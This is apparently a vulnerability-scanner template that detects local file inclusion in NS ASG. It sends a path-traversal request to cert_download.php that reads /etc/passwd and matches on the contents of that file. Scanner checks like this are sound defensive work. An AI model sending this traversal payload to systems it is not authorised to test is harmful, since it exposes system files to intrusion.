id: "nsasg-arbitrary-file-read"
name: "NS ASG - Local File Inclusion"
severity: "high"
description: "NS ASG is vulnerable to local file inclusion."
tech:
  - "php"
tags:
  - "nsasg"
  - "lfi"
  - "vuln"
cwe: "CWE-22"
reference: "https://zhuanlan.zhihu.com/p/368054963"
spaExclusion: true
request:
  method: "GET"
  path: "/admin/cert_download.php?file=pqpqpqpq.txt&certfile=../../../../../../../../etc/passwd"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "or"
matchers:
  - type: "regex"
    part: "body"
    regex:
      - "root:.*:0:0:"
  - type: "word"
    part: "body"
    words:
      - "$certfile"
      - "application/pdf"
    condition: "and"
